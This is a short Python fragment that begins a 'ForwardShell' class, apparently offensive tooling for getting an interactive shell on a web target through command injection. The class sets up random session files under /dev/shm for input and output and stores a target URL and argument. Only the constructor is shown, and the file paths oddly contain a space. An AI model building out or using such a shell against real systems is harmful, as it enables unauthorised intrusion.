#!/usr/bin/env python3

import requests

from base64 import b64encode
from random import randint

class ForwardShell:

    def __init__(self, url, arg):
        session = randint(1000,9999)
        self.stdin = f"/dev/shm {session}.input"
        self.stdout = f"/dev/shm {session}.output"
        self.main_url = url
        self.arg = arg

